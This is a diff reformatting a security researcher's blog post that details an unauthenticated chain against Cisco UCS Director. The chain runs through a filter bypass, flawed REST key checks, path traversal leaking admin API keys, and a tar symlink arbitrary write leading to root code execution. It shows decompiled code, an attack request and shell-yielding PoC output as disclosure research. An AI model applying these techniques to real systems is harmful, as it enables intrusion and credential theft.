@@ -3,46 +3,40 @@ layout: post
 title: "Strike Three :: Symlinking Your Way to Unauthenticated Access Against Cisco UCS Director"
 date: 2020-04-17 09:00:00 -0500
 categories: blog
-excerpt_separator: <!--more-->
 ---
 
-<img class="excel" alt="Cisco - Unified Computing System or Unauthenticated Cisco Shell" src="/assets/images/strike-three-directing-your-way-to-unauthenticated-access-against-cisco-ucs-director/logo.png">
-<p class="cn" markdown="1">This is the final blog post to my series of attacks against Cisco software. If you haven't seen the previous posts, I recommend you check them out [here](/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html) and [here](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html). Like always, we will start from an unauthenticated context and work our way up to full blown remote code execution as root and I will share some of the interesting discoveries along the way :-)</p>
+![Cisco - Unified Computing System or Unauthenticated Cisco Shell](/assets/images/strike-three/logo.png "Cisco - Unified Computing System or Unauthenticated Cisco Shell")
+
+This is the final blog post to my series of attacks against Cisco software. If you haven't seen the previous posts, I recommend you check them out [here](/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html) and [here](/blog/2020/01/14/busting-ciscos-beans-hardcoding-your-way-to-hell.html). Like always, we will start from an unauthenticated context and work our way up to full blown remote code execution as root and I will share some of the interesting discoveries along the way :-)
 <!--more-->
 
-<p class="cn">TL;DR</p>
-
-<p class="cn" markdown="1">*In this post, I will walk through some of the vulnerabilities I discovered in Cisco UCS Director and what makes them interesting and unique to other discoveries. If there is one thing you take away from this post, it's that the tar command executed against an untrusted file is considered harmful.*</p>
+TL;DR; *In this post, I will walk through some of the vulnerabilities I discovered in Cisco UCS Director and what makes them interesting and unique to other discoveries. If there is one thing you take away from this post, it's that the tar command executed against an untrusted file is considered harmful.*
 
 ## Testing Environment
 
-<p class="cn" markdown="1">In the interest of reproducibility, here are the details of the software I tested.</p>
+In the interest of reproducibility, here are the details of the software I tested.
 
-<div markdown="1" class="cn">
 - Name: Cisco UCS Director 6.7.3.0 VMWARE Evaluation
 - File: CUCSD_6_7_3_0_67414_VMWARE_SIGNED_EVAL.zip
 - Version: 6.7.3.0 VMWARE Evaluation (latest at the time)
 - MD5: 3f79463a654c91dbf4b620884e2a3b21
 - Size: 4355.99 MB (4567591797 bytes)
 - Download: https://software.cisco.com/download/home/286320555/type/285018084/release/6
-</div>
 
 ## Authentication Bypass
 
-<p class="cn" markdown="1">Typically speaking, in a web app the majority of an attack surface is exposed to authenticated users. Therefore, in order to expose this surface, one needs an authentication bypass of some sort. This is always the hardest part of the auditing process and quite often an attacker has to get creative and either find a single flaw or a series of subtle mistakes that can lead to a complete authentication bypass, ideally without a social engineering context.</p> 
+Typically speaking, in a web app the majority of an attack surface is exposed to authenticated users. Therefore, in order to expose this surface, one needs an authentication bypass of some sort. This is always the hardest part of the auditing process and quite often an attacker has to get creative and either find a single flaw or a series of subtle mistakes that can lead to a complete authentication bypass, ideally without a social engineering context.
 
-<p class="cn" markdown="1">In this example, we are in the latter position and I will break down the small mistakes that lead to the leak of the admins rest API key and subsequent session creation with high privileges. Below is the list of vulnerabilities that allowed for a complete authentication bypass!</p>
+In this example, we are in the latter position and I will break down the small mistakes that lead to the leak of the admins rest API key and subsequent session creation with high privileges. Below is the list of vulnerabilities that allowed for a complete authentication bypass!
 
-<div markdown="1" class="cn">
 1. RESTUrlRewrite RequestDispatcher.forward Filter Bypass
 2. RestAPI isEnableRestKeyAccessCheckForUser Flawed Logic
 3. RestAPI$MyCallable call Arbitrary Directory Creation
 4. RestAPI downloadFile Directory Traversal Information Disclosure
-</div>
 
 ###  1. RESTUrlRewrite RequestDispatcher.forward Filter Bypass
 
-<p class="cn" markdown="1">Looking inside of `/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/WEB-INF/web.xml` we can see the following entries:</p>
+Looking inside of `/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/WEB-INF/web.xml` we can see the following entries:
 
 ```xml
   <servlet>
@@ -66,7 +60,7 @@ excerpt_separator: <!--more-->
   </servlet-mapping>
 ```
 
-<p class="cn" markdown="1">These are essentially protected by the `RestAuth` filter.</p>
+These are essentially protected by the `RestAuth` filter.
 
 ```xml
     <filter-name>RestAuth</filter-name>
@@ -78,9 +72,9 @@ excerpt_separator: <!--more-->
   </filter-mapping>
 ```
 
-<p class="cn" markdown="1">Upon inspection of the `RestAuth` filter, there doesn't seem to be a way to bypass this filter after [CVE-2019-1937](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby). However, it maybe possible to find a forwarding servlet/filter that we can reach unauthenticated that will reach the API for us. As it turns out, in another web application that was exposed, there is.</p>
+Upon inspection of the `RestAuth` filter, there doesn't seem to be a way to bypass this filter after [CVE-2019-1937](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby). However, it maybe possible to find a forwarding servlet/filter that we can reach unauthenticated that will reach the API for us. As it turns out, in another web application that was exposed, there is.
 
-<p class="cn" markdown="1">Forwarding filters/servlets are interesting because they allow a attacker to bypass any remaining filters to the target servlet. Let's try to understand this with a real example. Inside of the `/opt/infra/web_cloudmgr/apache-tomcat/webapps/cloupia/WEB-INF/web.xml` file we see:</p>
+Forwarding filters/servlets are interesting because they allow a attacker to bypass any remaining filters to the target servlet. Let's try to understand this with a real example. Inside of the `/opt/infra/web_cloudmgr/apache-tomcat/webapps/cloupia/WEB-INF/web.xml` file we see:
 
 ```xml
     <filter-mapping>
@@ -97,7 +91,7 @@ excerpt_separator: <!--more-->
   </filter>
 ```
 
-<p class="cn" markdown="1">If we access that uri pattern from the cloupia application, then we will hit the `RESTUrlRewriteFilter` filter. Let's see the code inside of that filter:</p>
+If we access that uri pattern from the cloupia application, then we will hit the `RESTUrlRewriteFilter` filter. Let's see the code inside of that filter:
 
 ```java
 /*    */   public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
@@ -122,11 +116,11 @@ excerpt_separator: <!--more-->
 /* 64 */         dispatcher.forward(request, res);                                                 // 4
 ```
 
-<p class="cn" markdown="1">At *[1]* the code gets the attackers supplied URI request and at *[2]* the code checks to see if it starts with "cloupia", if it does, it replaces it with "/" and stores it into `newURI` at *[3]* . Finally at *[4]* the code calls `RequestDispatcher.forward` to forward the request. This allows an attacker to side step the `RestAuth` filter and reach the `RestAPI` class.</p>
+At *[1]* the code gets the attackers supplied URI request and at *[2]* the code checks to see if it starts with "cloupia", if it does, it replaces it with "/" and stores it into `newURI` at *[3]* . Finally at *[4]* the code calls `RequestDispatcher.forward` to forward the request. This allows an attacker to side step the `RestAuth` filter and reach the `RestAPI` class.
 
 ### 2. RestAPI isEnableRestKeyAccessCheckForUser authentication bypass
 
-<p class="cn" markdown="1">Inside of the `com.cloupia.client.web.RestAPI` class we can find the following code:</p>
+Inside of the `com.cloupia.client.web.RestAPI` class we can find the following code:
 
 ```java
 /*      */ public class RestAPI
@@ -149,7 +143,7 @@ excerpt_separator: <!--more-->
 /*   91 */   protected void doPut(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request, response); }
 ```
 
-<p class="cn" markdown="1">Any PUT/GET/DELETE request made by an attacker will land in the `doPost` method below.</p>
+Any PUT/GET/DELETE request made by an attacker will land in the `doPost` method below.
 
 ```java
 /*      */   public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
@@ -224,7 +218,7 @@ excerpt_separator: <!--more-->
 /*      */     }
 ```
 
-<p class="cn" markdown="1">It's possible for a remote attacker to reach *[1]*, which is a call to `executeGenericOp` using the attacker supplied request.</p>
+It's possible for a remote attacker to reach *[1]*, which is a call to `executeGenericOp` using the attacker supplied request.
 
 ```java
 /*      */   private void executeGenericOp(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
@@ -283,9 +277,9 @@ excerpt_separator: <!--more-->
 /*      */     } 
 ```
 
-<p class="cn" markdown="1">At *[2]* and *[3]* the code sets the `opName` and `opData` variables from attacker supplied data in the request. Then at *[4]* we make sure that our request contains the header "X-Cloupia-Request-Key". This is to ensure we don't land at *[5]* and continue to *[6]* where `opName` needs to start with "userAPI" or contain ":userAPI".</p>
+At *[2]* and *[3]* the code sets the `opName` and `opData` variables from attacker supplied data in the request. Then at *[4]* we make sure that our request contains the header "X-Cloupia-Request-Key". This is to ensure we don't land at *[5]* and continue to *[6]* where `opName` needs to start with "userAPI" or contain ":userAPI".
 
-<p class="cn" markdown="1">If it does, then we can reach *[7]* which is a call to `isEnableRestKeyAccessCheckForUser`. **Upon failure of a rest key check, this method should return false.**</p>
+If it does, then we can reach *[7]* which is a call to `isEnableRestKeyAccessCheckForUser`. **Upon failure of a rest key check, this method should return false.**
 
 ```java
 /*      */   public static boolean isEnableRestKeyAccessCheckForUser(HttpServletRequest request) {
@@ -330,11 +324,11 @@ excerpt_separator: <!--more-->
 /*      */   }
 ```
 
-<p class="cn" markdown="1">At *[8]* the code gets the `restKey` from the request header "X-Cloupia-Request-Key" and at *[9]* there is a check to see if the value is NULL or an empty string. Assuming it's not (but it could be) we land into the else at *[11]* because at *[10]* the check will fail since `keyUser` will be NULL.</p>
+At *[8]* the code gets the `restKey` from the request header "X-Cloupia-Request-Key" and at *[9]* there is a check to see if the value is NULL or an empty string. Assuming it's not (but it could be) we land into the else at *[11]* because at *[10]* the check will fail since `keyUser` will be NULL.
 
-<p class="cn" markdown="1">Then at *[12]* there is a check to see if `keyMatch` is set to true, which it isn't because we didn't have a matching key. Since we don't land into the block at *[12]* we circumvent further checks and at *[13]* we return true!</p>
+Then at *[12]* there is a check to see if `keyMatch` is set to true, which it isn't because we didn't have a matching key. Since we don't land into the block at *[12]* we circumvent further checks and at *[13]* we return true!
 
-<p class="cn" markdown="1">Continuing on through the `executeGenericOp` method:</p>
+Continuing on through the `executeGenericOp` method:
 
 ```java
 *  283 */     if (!isRestAPIAccessEnabledUser) {                    // 14
@@ -352,15 +346,15 @@ excerpt_separator: <!--more-->
 /*      */     } 
 ```
 
-<p class="cn" markdown="1">At *[14]* we can bypass the check because `isRestAPIAccessEnabledUser` is set to true from the return value of `isEnableRestKeyAccessCheckForUser`. Then at *[15]* the code extracts the `apiName` from the attacker supplied `opName`. At *[16]* the code checks to see if the `apiName` is set to "userAPIDownloadFile" and if so, calls `downloadFile` at *[17]*.</p>
+At *[14]* we can bypass the check because `isRestAPIAccessEnabledUser` is set to true from the return value of `isEnableRestKeyAccessCheckForUser`. Then at *[15]* the code extracts the `apiName` from the attacker supplied `opName`. At *[16]* the code checks to see if the `apiName` is set to "userAPIDownloadFile" and if so, calls `downloadFile` at *[17]*.
 
 ### 3. RestAPI$MyCallable call Arbitrary Directory Creation
 
-<p class="cn" markdown="1">Before we can download a valid file though, the path needs to exist on the filesystem. By default, the `/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports` directory doesn't exist.</p>
+Before we can download a valid file though, the path needs to exist on the filesystem. By default, the `/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports` directory doesn't exist.
 
-<p class="cn" markdown="1">So we need to find an API that allows for path creation, this is quite common in targets and I found one in the `RestAPI$MyCallable` `call` method. *Side note for those wondering: The $ character in the class means that the `MyCallable` class is an inline class inside of the `RestAPI` class.*</p>
+So we need to find an API that allows for path creation, this is quite common in targets and I found one in the `RestAPI$MyCallable` `call` method. *Side note for those wondering: The $ character in the class means that the `MyCallable` class is an inline class inside of the `RestAPI` class.*
 
-<p class="cn" markdown="1">Inside of the `executeGenericOp` method of the `RestAPI` class, we can see:</p>
+Inside of the `executeGenericOp` method of the `RestAPI` class, we can see:
 
 ```java
 /*  310 */     if ("userAPIUnifiedImport".equals(apiName)) {
@@ -374,7 +368,7 @@ excerpt_separator: <!--more-->
 /*  318 */       userApiUpload(fileInfo, callable);                                                     // 2
 ```
 
-<p class="cn" markdown="1">This code will call `initialiseFileUplod` and will return a `MyCallable` instance at *[1]*. *Side note: Misspelt functions names are a sure fire sign of poor security!*</p>
+This code will call `initialiseFileUplod` and will return a `MyCallable` instance at *[1]*. *Side note: Misspelt functions names are a sure fire sign of poor security!*
 
 ```java
 /*      */   public MyCallable initialiseFileUplod(HttpServletRequest request) {
@@ -392,7 +386,7 @@ excerpt_separator: <!--more-->
 /*      */   }
 ```
 
-<p class="cn" markdown="1">Then at *[2]* the callable will be parsed to `userApiUpload`.</p>
+Then at *[2]* the callable will be parsed to `userApiUpload`.
 
 ```java
 /*      */   private void userApiUpload(FileUploadInfo fileInfo, MyCallable callable) {
@@ -405,7 +399,7 @@ excerpt_separator: <!--more-->
 /*      */   }
 ```
 
-<p class="cn" markdown="1">This code will start a new threaded task at *[3]* and triggers the `call` method inside of the `MyCallable` class.</p>
+This code will start a new threaded task at *[3]* and triggers the `call` method inside of the `MyCallable` class.
 
 ```java
 /*      */     public FileUploadInfo call() {
@@ -453,15 +447,15 @@ excerpt_separator: <!--more-->
 /*  950 */       myfile.getParentFile().mkdirs();                                                   // 7
 ```
 
-<p class="cn" markdown="1">The `fileInfo` field is set with attacker controlled values from the request from the previous call to `getFileInfo` in the `executeGenericOp` method. At *[4]* we can see the `fileName` is attacker supplied and later at *[5]* the code builds a string with the supplied filename from the upload request.</p>
+The `fileInfo` field is set with attacker controlled values from the request from the previous call to `getFileInfo` in the `executeGenericOp` method. At *[4]* we can see the `fileName` is attacker supplied and later at *[5]* the code builds a string with the supplied filename from the upload request.
 
-<p class="cn" markdown="1">At *[6]* a new file instance is created and finally at *[7]* the `getParentFile` method is called which will return the directory structure supplied by the attacker. Finally at *[7]* the `mkdirs` method is called to create the attacker supplied directory structure. In my poc, I supplied the "../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/junk" string because `getParentFile` will return "../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/"</p>
+At *[6]* a new file instance is created and finally at *[7]* the `getParentFile` method is called which will return the directory structure supplied by the attacker. Finally at *[7]* the `mkdirs` method is called to create the attacker supplied directory structure. In my poc, I supplied the "../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/junk" string because `getParentFile` will return "../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/"
 
-<p class="cn" markdown="1">Finally, the `mkdirs` method will be triggered on the "/opt/infra/uploads/ApiUploads/../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" string.</p>
+Finally, the `mkdirs` method will be triggered on the "/opt/infra/uploads/ApiUploads/../../web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" string.
 
 ### 4. RestAPI downloadFile Directory Traversal Information Disclosure
 
-<p class="cn" markdown="1">Now that our exports directory is created, let's disclose the `downloadFile` method from the `RestAPI` class:</p>
+Now that our exports directory is created, let's disclose the `downloadFile` method from the `RestAPI` class:
 
 ```java
 /*      */   private void downloadFile(String opData, HttpServletResponse response) {
@@ -513,7 +507,7 @@ excerpt_separator: <!--more-->
 /*      */   }
 ```
 
-<p class="cn" markdown="1">At *[1]* the code calls `getFileNameFromOpData` which literally extracts the filename from the attacker supplied json object in `opData`.</p>
+At *[1]* the code calls `getFileNameFromOpData` which literally extracts the filename from the attacker supplied json object in `opData`.
 
 ```java
 /*     */   public static String getFileNameFromOpData(String opData) {
@@ -532,7 +526,7 @@ excerpt_separator: <!--more-->
 /*     */   }
 ```
 
-<p class="cn" markdown="1">Then at *[2]* the code calls `validateFileDownload` on the attacker supplied filename.</p>
+Then at *[2]* the code calls `validateFileDownload` on the attacker supplied filename.
 
 ```java
 /*     */   public static String validateFileDownload(String fileName) {
@@ -562,15 +556,15 @@ excerpt_separator: <!--more-->
 /*     */   }
 ```
 
-<p class="cn" markdown="1">Basically, this function just checks that the file exists and will resolve a path with traversals in it. But remember, the exports directory needs to exist for us to return an empty value for `errMsg`.</p>
+Basically, this function just checks that the file exists and will resolve a path with traversals in it. But remember, the exports directory needs to exist for us to return an empty value for `errMsg`.
 
-<p class="cn" markdown="1">Finally, at *[3]*, *[4]* and *[5]* the attacker supplied path to the filename is concatenated with "/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" and read into the `stream` variable. The contents of the `stream` variable (thus the attacker supplied file) is written to the output stream of the request.</p>
+Finally, at *[3]*, *[4]* and *[5]* the attacker supplied path to the filename is concatenated with "/opt/infra/web_cloudmgr/apache-tomcat/webapps/app/cloudmgr/exports/" and read into the `stream` variable. The contents of the `stream` variable (thus the attacker supplied file) is written to the output stream of the request.
 
 ### Exploitation
 
-<p class="cn" markdown="1">Using this ability to leak a file unauthenticated, an attacker can leak the `/opt/infra/idaccessmgr/logfile.txt` which contains API keys of admin users that have previously logged into the application.</p>
+Using this ability to leak a file unauthenticated, an attacker can leak the `/opt/infra/idaccessmgr/logfile.txt` which contains API keys of admin users that have previously logged into the application.
 
-<p class="cn" markdown="1">Since this file can be large, I created a method to leak the contents of that file using chunked transfer encoding as described in [RFC 7230](https://tools.ietf.org/html/rfc7230) so it will significantly speed up the API key leak. Once the key is leaked, it's possible to hit the /api-v2/ endpoint with the supplied API key in the header and the application will generate an authenticated session of that users API key!</p>
+Since this file can be large, I created a method to leak the contents of that file using chunked transfer encoding as described in [RFC 7230](https://tools.ietf.org/html/rfc7230) so it will significantly speed up the API key leak. Once the key is leaked, it's possible to hit the /api-v2/ endpoint with the supplied API key in the header and the application will generate an authenticated session of that users API key!
 
 ```bash
 saturn:~ mr_me$ ./poc.py 192.168.100.144
@@ -581,11 +575,11 @@ saturn:~ mr_me$ ./poc.py 192.168.100.144
 
 ## Remote Code Execution
 
-<p class="cn" markdown="1">Since I have the habit of finding multiple remote code execution vulnerabilities after authentication, I am only going to describe the most interesting one I found.</p>
+Since I have the habit of finding multiple remote code execution vulnerabilities after authentication, I am only going to describe the most interesting one I found.
 
 ### CopyFileRunnable run Arbitrary Symlink Creation
 
-<p class="cn" markdown="1">The `com.cloupia.feature.userTemplates.ApplianceFileUploadEntryFormPage` class contains the vulnerable code reachable from `validatePageData`:</p>
+The `com.cloupia.feature.userTemplates.ApplianceFileUploadEntryFormPage` class contains the vulnerable code reachable from `validatePageData`:
 
 ```java
 /*     */ public class ApplianceFileUploadEntryFormPage
@@ -700,9 +694,9 @@ saturn:~ mr_me$ ./poc.py 192.168.100.144
 /* 189 */         t.start();                                    // 2
 ```
 
-<p class="cn" markdown="1">At *[1]* the code creates a new instance of the `CopyFileRunnable` class with attacker controlled `tempPath` and `actualFileName`. The `tempPath` variable contains a path to an uploaded zip file (ab)using the `LargeFileUploadServlet`. This is a jailed path, so this servlet is not vulnerable to any attacks on its own.</p>
+At *[1]* the code creates a new instance of the `CopyFileRunnable` class with attacker controlled `tempPath` and `actualFileName`. The `tempPath` variable contains a path to an uploaded zip file (ab)using the `LargeFileUploadServlet`. This is a jailed path, so this servlet is not vulnerable to any attacks on its own.
 
-<p class="cn" markdown="1">Let's take a look at the `run` method of the `CopyFileRunnable` class. This is triggered at *[2]* when the `start` method is called because the `CopyFileRunnable` class implements `Runnable`.</p>
+Let's take a look at the `run` method of the `CopyFileRunnable` class. This is triggered at *[2]* when the `start` method is called because the `CopyFileRunnable` class implements `Runnable`.
 
 ```java
 /*     */   class CopyFileRunnable
@@ -758,15 +752,15 @@ saturn:~ mr_me$ ./poc.py 192.168.100.144
 /*     */         } 
 ```
 
-<p class="cn" markdown="1">At *[3]* the code checks that the extension is of .ova and if so, proceeds to build a string array using the attacker controlled file that has been uploaded at *[4]*.</p>
+At *[3]* the code checks that the extension is of .ova and if so, proceeds to build a string array using the attacker controlled file that has been uploaded at *[4]*.
 
-<p class="cn" markdown="1">Finally at *[5]* the code attempts to execute `/bin/tar -xvf <attacker uploaded file>.ova`. It may appear that the attacker supplied filename could lead to command injection, but since the code is building an array, this is not the case.</p>
+Finally at *[5]* the code attempts to execute `/bin/tar -xvf <attacker uploaded file>.ova`. It may appear that the attacker supplied filename could lead to command injection, but since the code is building an array, this is not the case.
 
 ### Exploitation
 
-<p class="cn" markdown="1">Arbitray tar extraction is a very interesting primitive. Whilst most offensive researchers would naturally think to use a relative path traversal, (un)fortunately the tar command *will not* decompress file paths with traversals inside of them, despite that being an expected behaviour!</p>
+Arbitray tar extraction is a very interesting primitive. Whilst most offensive researchers would naturally think to use a relative path traversal, (un)fortunately the tar command *will not* decompress file paths with traversals inside of them, despite that being an expected behaviour!
 
-<p class="cn" markdown="1">After some thinking, I realized that it maybe possible to (ab)use a tar archive that contains a symlink that points to a dangerous path and then use another file (in the same tar) to write to that symlink creating an arbitrary write situation. Whilst the documentation of tar states that it requires the -P argument to extract files with symlinks *and* other files pointing to symlinks, on its own, it will still extract a tar archive with a single symlink in it. Cute.</p>
+After some thinking, I realized that it maybe possible to (ab)use a tar archive that contains a symlink that points to a dangerous path and then use another file (in the same tar) to write to that symlink creating an arbitrary write situation. Whilst the documentation of tar states that it requires the -P argument to extract files with symlinks *and* other files pointing to symlinks, on its own, it will still extract a tar archive with a single symlink in it. Cute.
 
 ```bash
 saturn:~ mr_me$ tar -xvf poc.ova 
@@ -778,13 +772,13 @@ saturn:~ mr_me$ ls -la si
 lrw-r--r--  1 mr_me  staff  5 Dec 31  1969 si -> /tmp/
 ```
 
-<p class="cn" markdown="1">But, notice the behaviour without the -P ? A symlink is still created. This almost wouldn't have been a problem because a temporary directory is created using a timestamp and this would have had to been bruteforced, but as it turns out, we can leak it with an error message from the application.</p>
+But, notice the behaviour without the -P ? A symlink is still created. This almost wouldn't have been a problem because a temporary directory is created using a timestamp and this would have had to been bruteforced, but as it turns out, we can leak it with an error message from the application.
 
-<p class="cn" markdown="1">This symlink is written to `/opt/infra/uploads/external/public/<timestamp>/`. That last directory is what changes, based on when the request is made. Given that we have this primitive, the checks in the `com.cloupia.client.web.FileUploadServlet` servlet class can now be bypassed because we have the symlink planted within the uploads path and the location leaked.</p>
+This symlink is written to `/opt/infra/uploads/external/public/<timestamp>/`. That last directory is what changes, based on when the request is made. Given that we have this primitive, the checks in the `com.cloupia.client.web.FileUploadServlet` servlet class can now be bypassed because we have the symlink planted within the uploads path and the location leaked.
 
 #### A Triple Check Bypass
 
-<p class="cn" markdown="1">Let's have a look at the code for the `com.cloupia.client.web.FileUploadServlet` servlet:</p>
+Let's have a look at the code for the `com.cloupia.client.web.FileUploadServlet` servlet:
 
 ```java
 /*     */   private void fileUpload(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
@@ -856,20 +850,20 @@ lrw-r--r--  1 mr_me  staff  5 Dec 31  1969 si -> /tmp/
 /*     */     }
 ```
 
-<p class="cn" markdown="1">At *[1]* the code gets the `filePath` which is attacker controlled and at *[2]* the code checks that our string starts with "/opt/infra/uploads/". Great! We pass the first validation check!</p>
+At *[1]* the code gets the `filePath` which is attacker controlled and at *[2]* the code checks that our string starts with "/opt/infra/uploads/". Great! We pass the first validation check!
 
-<p class="cn" markdown="1">Then the code checks "../" is not in our `filePath` at *[3]*. We can bypass that check too because we are pointing it to the symlink. Finally the the code checks that the file extension is not in this list at *[4]*:</p>
+Then the code checks "../" is not in our `filePath` at *[3]*. We can bypass that check too because we are pointing it to the symlink. Finally the the code checks that the file extension is not in this list at *[4]*:
 
 ```bash
 [root@localhost ~]# cat /opt/infra/inframgr/service.properties | grep UNSUPPORTED_FILE_EXTENSION
 UNSUPPORTED_FILE_EXTENSION = html,htm,js,jsp
 ```
 
-<p class="cn" markdown="1">You guessed it, we can also bypass that check too because our symlink has no extension! Suppose our symlink is called `si`, then attack string we use for the upload is:</p>
+You guessed it, we can also bypass that check too because our symlink has no extension! Suppose our symlink is called `si`, then attack string we use for the upload is:
 
 `POST /app/ui/FileUploadServlet?filePath=external/public/1571743726801/si HTTP/1.1`
 
-<p class="cn" markdown="1">Chaining everything together, we get our cake and can eat it too.</p>
+Chaining everything together, we get our cake and can eat it too.
 
 ```bash
 saturn:~ mr_me$ ./poc.py 
@@ -900,9 +894,9 @@ pwd
 /opt/infra/web_cloudmgr/apache-tomcat/bin
 ```
 
-<p class="cn" markdown="1">Wait, didn't you say root access mr_me?</p>
+Wait, didn't you say root access mr_me?
 
-<p class="cn" markdown="1">Yeah my bad. After grinding out 8 different post auth code exec bugs, I found out that a different web service (reachable from our authentication bypass) has a *by design feature* which is a built-in cloupia script interpreter allowing an authenticated attacker to execute arbitrary code as root. At that point, I didn't bother auditing any further and as it turns out, that's a forever day since Cisco declined to patch it:</p>
+Yeah my bad. After grinding out 8 different post auth code exec bugs, I found out that a different web service (reachable from our authentication bypass) has a *by design feature* which is a built-in cloupia script interpreter allowing an authenticated attacker to execute arbitrary code as root. At that point, I didn't bother auditing any further and as it turns out, that's a forever day since Cisco declined to patch it:
 
 ```bash
 saturn:~ mr_me$ ./poc.py 
@@ -924,8 +918,8 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 [root@localhost inframgr]#
 ```
 
-<p class="cn" markdown="1">You can see find the exploit code [here](/pocs/cve-2020-32{43,47}.py.txt) and [here](/pocs/src-2020-0014.py.txt). Excuse the py2 code eh?</p>
+You can see find the exploit code [here](/pocs/cve-2020-32{43,47}.py.txt) and [here](/pocs/src-2020-0014.py.txt). Excuse the py2 code eh?
 
 ## Conclusion
 
-<p class="cn" markdown="1">The ability to untar an untrusted file can break several assumptions made by developers and it's up to creative attackers to fully expose the impact of such a situation. Additionally, I still believe that applications *should not* allow by design remote code execution features but of course, if it's protected by authentication then you **really** want to make sure you don't have an authentication bypass vulnerability lurking in the code.</p>
+The ability to untar an untrusted file can break several assumptions made by developers and it's up to creative attackers to fully expose the impact of such a situation. Additionally, I still believe that applications *should not* allow by design remote code execution features but of course, if it's protected by authentication then you **really** want to make sure you don't have an authentication bypass vulnerability lurking in the code.
